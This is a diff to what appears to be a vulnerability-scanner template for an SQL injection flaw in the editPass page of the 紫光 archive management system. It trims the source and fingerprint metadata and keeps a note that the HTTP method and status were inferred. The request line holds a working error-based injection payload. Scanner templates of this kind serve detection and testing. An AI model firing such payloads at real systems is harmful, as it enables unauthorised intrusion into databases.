@@ -3,14 +3,8 @@ info:
   name: 紫光档案管理系统editPass存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e3e6c05ca1fc1d4e8b58c04a2065de35
-
-    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: e3e6c05ca1fc1d4e8b58c04a2065de35
-    fofa: + hunter`app.name="紫光档案管理系统"`
 http:
 - raw:
   - 'GET /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1))) HTTP/1.1
